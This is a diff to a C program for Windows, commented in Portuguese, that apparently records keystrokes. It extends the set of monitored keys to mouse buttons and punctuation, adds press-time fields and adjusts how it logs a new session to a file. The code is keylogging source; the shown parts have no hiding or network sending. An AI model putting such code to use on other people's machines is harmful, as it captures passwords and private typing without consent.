@@ -42,6 +42,19 @@ void VKParaString(int vk, char *buffer) {
         case VK_RIGHT:      strcpy(buffer, "SETA DIR");  break;
         case VK_DOWN:       strcpy(buffer, "SETA BAIXO");break;
         case VK_DELETE:     strcpy(buffer, "DELETE");    break;
+        case VK_LBUTTON:    strcpy(buffer, "MOUSE ESQUERDO"); break;
+        case VK_RBUTTON:    strcpy(buffer, "MOUSE DIREITO");  break;
+        case VK_MBUTTON:    strcpy(buffer, "MOUSE MEIO");     break;
+        case VK_OEM_COMMA:  strcpy(buffer, ",");              break;
+        case VK_OEM_PERIOD: strcpy(buffer, ".");              break;
+        case VK_OEM_2:      strcpy(buffer, "/");              break;
+        case VK_OEM_5:      strcpy(buffer, "\\");             break;
+        case VK_OEM_4:      strcpy(buffer, "[");              break;
+        case VK_OEM_6:      strcpy(buffer, "]");              break;
+        case VK_OEM_1:      strcpy(buffer, ";");              break;
+        case VK_OEM_7:      strcpy(buffer, "'");              break;
+        case VK_OEM_MINUS:  strcpy(buffer, "-");              break;
+        case VK_OEM_PLUS:   strcpy(buffer, "=");              break; 
         case VK_F1:  case VK_F2:  case VK_F3:  case VK_F4:
         case VK_F5:  case VK_F6:  case VK_F7:  case VK_F8:
         case VK_F9:  case VK_F10: case VK_F11: case VK_F12:
@@ -68,30 +81,33 @@ void VKParaString(int vk, char *buffer) {
 }
 
 // essa função adiciona as teclas monitoradas no vetor de structs
-void AdicionarTecla(int vk) {
+void AdicionarTecla(int vk, int eh_mouse) {
     // condição para evitar o estouro do limite do vetor teclas
     if (total_teclas >= MAX_TECLAS) return;
     teclas[total_teclas].vk = vk; // registra o codigo vk
     teclas[total_teclas].estava_pressionada = 0; // marca como não pressionada
+    teclas[total_teclas].tempo_pressionou = 0;
+    teclas[total_teclas].horario_pressionou[0] = '\0';
+    teclas[total_teclas].eh_mouse = eh_mouse; // marca se é uma tecla de mouse ou não
     total_teclas++; // contador para atender limite de 90 teclas
 
 }
 
 // função para adicionar as teclas que serão monitoradas
 void InicializarTeclas() {
-    for(char c = 'A'; c <= 'Z'; c++) AdicionarTecla(c);
-    for(char c = '0'; c <= '9'; c++) AdicionarTecla(c);
+    for(char c = 'A'; c <= 'Z'; c++) AdicionarTecla(c, 0);
+    for(char c = '0'; c <= '9'; c++) AdicionarTecla(c, 0);
 
-    AdicionarTecla(VK_SPACE);   AdicionarTecla(VK_RETURN);
-    AdicionarTecla(VK_BACK);    AdicionarTecla(VK_TAB);
-    AdicionarTecla(VK_ESCAPE);  AdicionarTecla(VK_SHIFT);
-    AdicionarTecla(VK_CONTROL); AdicionarTecla(VK_MENU);
-    AdicionarTecla(VK_CAPITAL); AdicionarTecla(VK_DELETE);
+    AdicionarTecla(VK_SPACE, 0);   AdicionarTecla(VK_RETURN, 0);
+    AdicionarTecla(VK_BACK, 0);    AdicionarTecla(VK_TAB, 0);
+    AdicionarTecla(VK_ESCAPE, 0);  AdicionarTecla(VK_SHIFT, 0);
+    AdicionarTecla(VK_CONTROL, 0); AdicionarTecla(VK_MENU, 0);
+    AdicionarTecla(VK_CAPITAL, 0); AdicionarTecla(VK_DELETE, 0);
 
-    AdicionarTecla(VK_LEFT); AdicionarTecla(VK_UP);
-    AdicionarTecla(VK_RIGHT); AdicionarTecla(VK_DOWN);
+    AdicionarTecla(VK_LEFT, 0); AdicionarTecla(VK_UP, 0);
+    AdicionarTecla(VK_RIGHT, 0); AdicionarTecla(VK_DOWN, 0);
 
-    for (int i = 0; i < 12; i++) AdicionarTecla(VK_F1 + i);
+    for (int i = 0; i < 12; i++) AdicionarTecla(VK_F1 + i, 0);
 }
 
 void LimparEstadoTeclas() {
@@ -178,7 +194,7 @@ int main() {
     if (arquivo == NULL) return 1;
 
     fprintf(arquivo, "===== NOVA SESSAO =====\n");
-    sprintf(linha, "[%s] Iniciado\n", horario);
+    sprintf(linha, "Iniciado [%s]\n", horario);
     fputs(linha, arquivo);
     fprintf(arquivo, "========================\n\n");
     fflush(arquivo);
